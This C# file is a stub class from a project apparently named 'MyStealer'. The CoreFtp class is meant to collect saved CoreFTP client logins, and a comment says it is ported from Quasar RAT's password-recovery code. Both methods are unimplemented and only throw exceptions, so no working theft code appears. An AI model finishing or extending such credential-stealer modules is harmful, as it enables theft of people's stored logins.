using System;
using System.Collections.Immutable;

namespace MyStealer.Collector.Client
{
    /// <summary>
    /// Ported from Quasar RAT
    /// https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/FtpClients/WinScpPassReader.cs
    /// </summary>
    public class CoreFtp : ClientCollector
    {
        public override string Name => "CoreFTP";

        public override bool IsAvailable() => throw new NotImplementedException();

        public override IImmutableSet<ClientLogin> GetLogins() => throw new NotImplementedException();
    }
}
